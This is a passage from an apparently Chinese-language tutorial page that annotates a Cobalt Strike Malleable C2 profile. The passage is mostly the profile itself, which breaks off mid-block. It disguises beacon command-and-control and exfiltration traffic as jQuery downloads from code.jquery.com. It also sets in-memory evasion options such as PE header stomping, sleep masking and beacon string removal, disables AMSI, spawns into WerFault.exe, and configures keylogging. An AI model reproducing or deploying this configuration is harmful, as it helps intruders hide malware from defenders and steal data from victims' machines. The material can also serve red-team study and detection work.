Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)},makeArray:function(e,t){var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)},guid:1,support:h}),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t){l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()});function C(e){var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&amp;&amp;(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1},P=\&quot;\r&quot;;
<a id="__codelineno-17-36" name="__codelineno-17-36" href="#__codelineno-17-36"></a>            # 1st Line
<a id="__codelineno-17-37" name="__codelineno-17-37" href="#__codelineno-17-37"></a>            prepend &quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;;
<a id="__codelineno-17-38" name="__codelineno-17-38" href="#__codelineno-17-38"></a>            # 响应中html页面尾部信息
<a id="__codelineno-17-39" name="__codelineno-17-39" href="#__codelineno-17-39"></a>            append &quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t){w.fn[t]=function(e,n){return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)}}),w.proxy=function(e,t){var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))},\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});&quot;;
<a id="__codelineno-17-40" name="__codelineno-17-40" href="#__codelineno-17-40"></a>            print;
<a id="__codelineno-17-41" name="__codelineno-17-41" href="#__codelineno-17-41"></a>        }
<a id="__codelineno-17-42" name="__codelineno-17-42" href="#__codelineno-17-42"></a>    }
<a id="__codelineno-17-43" name="__codelineno-17-43" href="#__codelineno-17-43"></a>}
</code></pre></div>
<h3 id="http-post-teamserverpost">http-post 结果的回传相当于受害者向teamserver发送一个post请求<a class="headerlink" href="#http-post-teamserverpost" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>http-post {
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a># 请求的地址
<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>    set uri &quot;/jquery-3.3.2.min.js&quot;;
<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>    # 请求的方法
<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>    set verb &quot;POST&quot;;
<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>    # 客户端配置
<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>    client {
<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>    # 请求头
<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;;
<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a>        #header &quot;Host&quot; &quot;code.jquery.com&quot;;
<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>        header &quot;Referer&quot; &quot;http://code.jquery.com/&quot;;
<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a>        header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;
<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>       # 参数
<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a>        id {
<a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a>            mask;       
<a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a>            base64url;
<a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>            parameter &quot;__cfduid&quot;;            
<a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a>        }
<a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a>
<a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a>        # 输出信息      
<a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a>        output {
<a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a>            mask;
<a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a>            base64url;
<a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a>            print;
<a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a>        }
<a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a>    }
<a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a>    server {
<a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a>        header &quot;Server&quot; &quot;NetDNA-cache/2.2&quot;;
<a id="__codelineno-18-29" name="__codelineno-18-29" href="#__codelineno-18-29"></a>        header &quot;Cache-Control&quot; &quot;max-age=0, no-cache&quot;;
<a id="__codelineno-18-30" name="__codelineno-18-30" href="#__codelineno-18-30"></a>        header &quot;Pragma&quot; &quot;no-cache&quot;;
<a id="__codelineno-18-31" name="__codelineno-18-31" href="#__codelineno-18-31"></a>        header &quot;Connection&quot; &quot;keep-alive&quot;;
<a id="__codelineno-18-32" name="__codelineno-18-32" href="#__codelineno-18-32"></a>        header &quot;Content-Type&quot; &quot;application/javascript; charset=utf-8&quot;;
<a id="__codelineno-18-33" name="__codelineno-18-33" href="#__codelineno-18-33"></a>        output {
<a id="__codelineno-18-34" name="__codelineno-18-34" href="#__codelineno-18-34"></a>            mask;
<a id="__codelineno-18-35" name="__codelineno-18-35" href="#__codelineno-18-35"></a>            base64url;
<a id="__codelineno-18-36" name="__codelineno-18-36" href="#__codelineno-18-36"></a>            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
<a id="__codelineno-18-37" name="__codelineno-18-37" href="#__codelineno-18-37"></a>            # 2nd Line            
<a id="__codelineno-18-38" name="__codelineno-18-38" href="#__codelineno-18-38"></a>            prepend &quot;!function(e,t){\&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)}:t(e)}(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t){\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType},y=function e(t){return null!=t&amp;&amp;t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e}var b=\&quot;3.3.1\&quot;,w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||{},s++),\&quot;object\&quot;==typeof a||g(a)||(a={}),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a},w.extend({expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)},makeArray:function(e,t){var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)},guid:1,support:h}),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t){l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()});function C(e){var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&amp;&amp;(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1},P=\&quot;\r&quot;;
<a id="__codelineno-18-39" name="__codelineno-18-39" href="#__codelineno-18-39"></a>            # 1st Line
<a id="__codelineno-18-40" name="__codelineno-18-40" href="#__codelineno-18-40"></a>            prepend &quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;;
<a id="__codelineno-18-41" name="__codelineno-18-41" href="#__codelineno-18-41"></a>            append &quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t){w.fn[t]=function(e,n){return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)}}),w.proxy=function(e,t){var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))},\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});&quot;;
<a id="__codelineno-18-42" name="__codelineno-18-42" href="#__codelineno-18-42"></a>            print;
<a id="__codelineno-18-43" name="__codelineno-18-43" href="#__codelineno-18-43"></a>        }
<a id="__codelineno-18-44" name="__codelineno-18-44" href="#__codelineno-18-44"></a>    }
<a id="__codelineno-18-45" name="__codelineno-18-45" href="#__codelineno-18-45"></a>}
</code></pre></div>
<h3 id="stage-beaconcobalt-strikecs">stage, 用于自定义Beacon（Cobalt Strike的恶意软件组件）在内存中的加载方式和表现形式,也就是用来自定义伪装cs自带的那些命令是如何在内存中表现的<a class="headerlink" href="#stage-beaconcobalt-strikecs" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>stage {
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>    # CS 4.2 added allocator and MZ header overrides
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>    set allocator      &quot;VirtualAlloc&quot;; # allocator用于设置Beacon的反射加载器（Reflective Loader）,如何为代理（agent）分配内存  Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>    #set magic_mz_x86   &quot;MZRE&quot;;
<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>    #set magic_mz_x64   &quot;MZAR&quot;;
<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>    set magic_pe       &quot;NO&quot;;  # 不覆盖Beacon的反射加载器使用的PE文件
<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>    set userwx         &quot;false&quot;;   # 不要求反射加载器在内存中的权限
<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>    set stomppe        &quot;true&quot;;  # 要求反射加载器在加载Beacon有效载荷后覆盖MZ（Microsoft Windows Portable Executable File）头、PE头和e_lfanew值。
<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>    set obfuscate      &quot;true&quot;;  # obfuscate启用对反射DLL的导入表进行混淆，覆盖未使用的头部内容，并要求反射加载器在没有DLL头的情况下将Beacon复制到新内存中
<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>    set cleanup        &quot;true&quot;;  # cleanup要求Beacon尝试释放与反射DLL包相关联的内存。
<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>    # CS 3.12 Addition &quot;Obfuscate and Sleep&quot;
<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>    set sleep_mask     &quot;true&quot;;  # 启用在Beacon（HTTP、SMB、TCP Beacons）在内存中睡眠或等待新连接/数据之前对其进行混淆的功能
<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>    # CS 4.1  
<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>    set smartinject    &quot;true&quot;;  # 启用使用嵌入式函数指针提示来引导Beacon代理
<a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>
<a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>    # Make the Beacon Reflective DLL look like something else in memory
<a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a>    # Values captured using peclone agaist a Windows 10 version of explorer.exe
<a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a>    set checksum       &quot;0&quot;;  # 设置Beacon的PE头部中的校验和值。
<a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a>    set compile_time   &quot;11 Nov 2016 04:08:32&quot;;  # 设置Beacon的PE头部中的编译时间
<a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a>    set entry_point    &quot;650688&quot;;  # 设置Beacon的PE头部中的入口点值。
<a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a>    set image_size_x86 &quot;4661248&quot;;
<a id="__codelineno-19-22" name="__codelineno-19-22" href="#__codelineno-19-22"></a>    set image_size_x64 &quot;4661248&quot;;
<a id="__codelineno-19-23" name="__codelineno-19-23" href="#__codelineno-19-23"></a>    set name           &quot;srv.dll&quot;;
<a id="__codelineno-19-24" name="__codelineno-19-24" href="#__codelineno-19-24"></a>    set rich_header    &quot;\x75\x92\x8d\x57\x7e\xda\xcd\x57\xf8\x85\x35\xab\x72\x6a\x6e\xee\xa2\x86\x29\x6c&quot;;
<a id="__codelineno-19-25" name="__codelineno-19-25" href="#__codelineno-19-25"></a>
<a id="__codelineno-19-26" name="__codelineno-19-26" href="#__codelineno-19-26"></a>    ## WARNING: Module stomping 
<a id="__codelineno-19-27" name="__codelineno-19-27" href="#__codelineno-19-27"></a>    # Cobalt Strike 3.11 also adds module stomping to Beacon&#39;s Reflective Loader. When enabled, Beacon&#39;s loader will shun VirtualAlloc and instead load a DLL into the current process and overwrite its memory.
<a id="__codelineno-19-28" name="__codelineno-19-28" href="#__codelineno-19-28"></a>    # Set module_x86 to a favorite x86 DLL to module stomp with the x86 Beacon. The module_x64 option enables this for the x64 Beacon.
<a id="__codelineno-19-29" name="__codelineno-19-29" href="#__codelineno-19-29"></a>    # While this is a powerful feature, caveats apply! If the library you load is not large enough to host Beacon, you will crash Beacon&#39;s process. If the current process loads the same library later (for whatever reason), you will crash Beacon&#39;s process. Choose carefully.
<a id="__codelineno-19-30" name="__codelineno-19-30" href="#__codelineno-19-30"></a>    # By default, Beacon&#39;s loader allocates memory with VirtualAlloc. Module stomping is an alternative to this. Set module_x86 to a DLL that is about twice as large as the Beacon payload itself. Beacon&#39;s x86 loader will load the specified DLL, find its location in memory, and overwrite it. This is a way to situate Beacon in memory that Windows associates with a file on disk. It&#39;s important that the DLL you choose is not needed by the applications you intend to reside in. The module_x64 option is the same story, but it affects the x64 Beacon.
<a id="__codelineno-19-31" name="__codelineno-19-31" href="#__codelineno-19-31"></a>    # Details can be found in the In-memory Evasion video series. https://youtu.be/uWVH9l2GMw4
<a id="__codelineno-19-32" name="__codelineno-19-32" href="#__codelineno-19-32"></a>
<a id="__codelineno-19-33" name="__codelineno-19-33" href="#__codelineno-19-33"></a>    # set module_x64 &quot;netshell.dll&quot;;
<a id="__codelineno-19-34" name="__codelineno-19-34" href="#__codelineno-19-34"></a>    # set module_x86 &quot;netshell.dll&quot;;
<a id="__codelineno-19-35" name="__codelineno-19-35" href="#__codelineno-19-35"></a>
<a id="__codelineno-19-36" name="__codelineno-19-36" href="#__codelineno-19-36"></a>    # The transform-x86 and transform-x64 blocks pad and transform Beacon&#39;s Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
<a id="__codelineno-19-37" name="__codelineno-19-37" href="#__codelineno-19-37"></a>    transform-x86 { # transform the x86 rDLL stage
<a id="__codelineno-19-38" name="__codelineno-19-38" href="#__codelineno-19-38"></a>        prepend &quot;\x87\xdb\x66\x87\xd2\x49\x66\x90\x87\xd2\x0f\x1f\x00\x87\xc9\x41\x66\x87\xc9\x42\x44\x0f\x1f\x00\x40\x40\x66\x87\xdb\x0f\x1f\x04\x00\x48\x46\x4c\x90\x45\x43\x47\x66\x0f\x1f\x04\x00\x0f\x1f\x00&quot;; # prepend nops
<a id="__codelineno-19-39" name="__codelineno-19-39" href="#__codelineno-19-39"></a>        strrep &quot;ReflectiveLoader&quot; &quot;execute&quot;; # Change this text
<a id="__codelineno-19-40" name="__codelineno-19-40" href="#__codelineno-19-40"></a>        strrep &quot;This program cannot be run in DOS mode&quot; &quot;&quot;; # Remove this text
<a id="__codelineno-19-41" name="__codelineno-19-41" href="#__codelineno-19-41"></a>        strrep &quot;beacon.dll&quot; &quot;&quot;; # Remove this text
<a id="__codelineno-19-42" name="__codelineno-19-42" href="#__codelineno-19-42"></a>    }
<a id="__codelineno-19-43" name="__codelineno-19-43" href="#__codelineno-19-43"></a>    transform-x64 { # transform the x64 rDLL stage
<a id="__codelineno-19-44" name="__codelineno-19-44" href="#__codelineno-19-44"></a>        prepend &quot;\x87\xdb\x66\x87\xd2\x49\x66\x90\x87\xd2\x0f\x1f\x00\x87\xc9\x41\x66\x87\xc9\x42\x44\x0f\x1f\x00\x40\x40\x66\x87\xdb\x0f\x1f\x04\x00\x48\x46\x4c\x90\x45\x43\x47\x66\x0f\x1f\x04\x00\x0f\x1f\x00&quot;; # prepend nops
<a id="__codelineno-19-45" name="__codelineno-19-45" href="#__codelineno-19-45"></a>        strrep &quot;ReflectiveLoader&quot; &quot;execute&quot;; # Change this text in the Beacon DLL
<a id="__codelineno-19-46" name="__codelineno-19-46" href="#__codelineno-19-46"></a>        strrep &quot;beacon.x64.dll&quot; &quot;&quot;; # Remove this text in the Beacon DLL
<a id="__codelineno-19-47" name="__codelineno-19-47" href="#__codelineno-19-47"></a>    }
<a id="__codelineno-19-48" name="__codelineno-19-48" href="#__codelineno-19-48"></a>
<a id="__codelineno-19-49" name="__codelineno-19-49" href="#__codelineno-19-49"></a>    stringw &quot;jQuery&quot;; # Add this string to the DLL
<a id="__codelineno-19-50" name="__codelineno-19-50" href="#__codelineno-19-50"></a>}
</code></pre></div>
<h3 id="post-ex">post-ex 后渗透相关<a class="headerlink" href="#post-ex" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>post-ex {
<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>        # 指定了32位Beacon在执行后渗透（post-exploitation）任务时注入shellcode的目标程序路径
<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>        set spawnto_x86 &quot;%windir%\\syswow64\\WerFault.exe&quot;;
<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>        set spawnto_x64 &quot;%windir%\\sysnative\\WerFault.exe&quot;;
<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>        # 启用对后渗透DLL的混淆
<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>        set obfuscate &quot;true&quot;;
<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>        # 启用智能注入功能
<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>        set smartinject &quot;true&quot;;
<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>        # 禁用AMSI
<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a>        set amsi_disable &quot;true&quot;;
<a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>        # 定义了用于后渗透任务的命名管道名称。
<a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>        set pipename &quot;Winsock2\\CatalogChangeListener-###-0,&quot;;
<a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a>        # 设置键盘记录使用的函数
<a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a>        set keylogger &quot;GetAsyncKeyState&quot;;
<a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a>}
</code></pre></div>
<h3 id="process-inject">process-inject 进程注入自定义的参数<a class="headerlink" href="#process-inject" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>process-inject {
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>    set allocator &quot;NtMapViewOfSection&quot;;  # 设置远程进程中内存分配的方法为 NtMapViewOfSection
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>    set min_alloc &quot;17500&quot;;  # 注入内容的最小内存分配大小
<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>
<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>    # Set memory permissions as permissions as initial=RWX, final=RX
<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>    set startrwx &quot;false&quot;;  # 注入内容的初始内存权限,false意味着不是读写执行
